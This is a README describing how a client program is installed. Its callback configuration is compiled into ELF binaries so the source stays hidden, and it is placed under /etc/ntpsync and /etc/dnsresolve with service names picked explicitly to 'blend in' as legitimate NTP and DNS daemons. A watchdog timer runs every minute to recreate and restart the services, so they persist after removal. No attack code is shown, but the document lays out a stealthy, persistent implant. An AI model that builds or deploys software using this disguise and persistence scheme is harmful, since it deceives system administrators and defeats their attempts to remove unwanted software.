# Client Installation Files

## Overview

The client uses a template-based installation system where configuration is embedded directly into Python scripts, which are then compiled to standalone binary executables using PyInstaller.

## File Descriptions

### Source Files (in repository)

1. **ntp-daemon** 
   - Python script template for the client
   - Contains placeholders: `{{SERVER_HOST}}`, `{{SERVER_PORT}}`, `{{CLIENT_NAME}}`
   - Used by `install.sh` to create the final configured script

2. **conf** (bash version - kept for reference)
   - Original bash monitor/watchdog script
   
3. **conf.py** (Python version - used for installation)
   - Monitor/watchdog script in Python
   - Checks service health every minute
   - Recreates missing service files
   - Restarts stopped services
   - Compiled to binary during installation

4. **client.py**
   - Original client script (uses .env file)
   - For standalone testing and development
   - Not used during installation

5. **env.example**
   - Configuration template
   - Copy to `.env` and edit before installation

6. **install.sh**
   - Reads `.env` file
   - Replaces placeholders in `ntp-daemon` with actual values
   - Installs configured script to `/etc/ntpsync/ntp`
   - Sets up systemd services

7. **uninstall.sh**
   - Removes all installed files and services
   - Cleans up systemd configuration

### Installed Files (on target system)

1. **/etc/ntpsync/ntp**
   - **Compiled binary executable** (ELF format)
   - Created from ntp-daemon template with embedded configuration
   - No Python source code visible
   - Configuration embedded during compilation

2. **/etc/dnsresolve/conf**
   - **Compiled binary executable** (ELF format)
   - Created from conf.py
   - No Python source code visible

3. **/etc/systemd/system/ntpsyncd.service**
   - Main service file
   - Runs `/etc/ntpsync/ntp`

4. **/etc/systemd/system/dnsresolv.service**
   - Monitor service file
   - Runs `/etc/dnsresolve/conf`

5. **/etc/systemd/system/dnsresolv.timer**
   - Timer that triggers monitor every minute

## Installation Flow

```
1. User creates .env file with configuration
   ↓
2. install.sh reads .env
   ↓
3. install.sh replaces {{placeholders}} in ntp-daemon
   ↓
4. Configured script saved to /etc/ntpsync/ntp
   ↓
5. conf copied to /etc/dnsresolve/conf
   ↓
6. Systemd services installed and enabled
   ↓
7. Services started
```

## Why This Approach?

1. **No .env dependency**: The installed script has configuration embedded, so no separate .env file is needed on the target system
2. **Clean installation**: All configuration in one place (/etc/ntpsync/ntp)
3. **Security**: No separate readable config file to worry about
4. **Simplicity**: Monitor script doesn't need to check for .env file existence

## Updating Configuration

Since configuration is embedded, updates require reinstallation:

```bash
# 1. Edit .env in client directory
nano .env

# 2. Reinstall (will update the embedded configuration)
sudo ./install.sh
```

## File Naming Rationale

- **ntp-daemon** → Creates `/etc/ntpsync/ntp` (looks like NTP system daemon)
- **conf** → `/etc/dnsresolve/conf` (looks like DNS resolver config/monitoring)
- This naming helps the files blend in as what appear to be legitimate system services:
  - `/etc/ntpsync/` - NTP synchronization daemon
  - `/etc/dnsresolve/` - DNS resolver configuration

